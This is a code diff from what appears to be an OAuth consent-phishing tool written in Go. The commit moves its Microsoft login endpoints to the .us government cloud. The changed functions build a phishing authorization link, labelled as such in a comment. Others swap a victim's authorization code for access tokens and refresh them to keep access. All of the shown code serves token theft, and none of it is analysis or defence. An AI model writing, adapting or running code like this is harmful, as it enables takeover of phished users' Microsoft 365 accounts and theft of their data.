@@ -16,7 +16,7 @@ import (
 // RefreshAccessToken will retrieve a new access token
 func RefreshAccessToken(user *model.User) bool {
 
-	postURL := "https://login.microsoftonline.com/common/oauth2/v2.0/token"
+	postURL := "https://login.microsoftonline.us/common/oauth2/v2.0/token"
 
 	formdata := url.Values{}
 	formdata.Add("client_id", model.GlbConfig.Oauth.ClientId)
@@ -71,14 +71,14 @@ func RecursiveTokenUpdate() {
 // GenerateURL gives the URL for phishing
 func GenerateURL() string {
 
-	phishURL := fmt.Sprintf("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=%s&redirect_uri=%s&response_type=code&client_id=%s", url.QueryEscape(model.GlbConfig.Oauth.Scope), url.QueryEscape(model.GlbConfig.Oauth.Redirecturi), url.QueryEscape(model.GlbConfig.Oauth.ClientId))
+	phishURL := fmt.Sprintf("https://login.microsoftonline.us/common/oauth2/v2.0/authorize?scope=%s&redirect_uri=%s&response_type=code&client_id=%s", url.QueryEscape(model.GlbConfig.Oauth.Scope), url.QueryEscape(model.GlbConfig.Oauth.Redirecturi), url.QueryEscape(model.GlbConfig.Oauth.ClientId))
 	return phishURL
 	//fmt.Println(phishURL)
 }
 
 // GetAllTokens will call the microsoft endpoint to get all the tokens
 func GetAllTokens(code string) []byte {
-	postURL := "https://login.microsoftonline.com/common/oauth2/v2.0/token"
+	postURL := "https://login.microsoftonline.us/common/oauth2/v2.0/token"
 
 	formdata := url.Values{}
 	formdata.Add("client_id", model.GlbConfig.Oauth.ClientId)
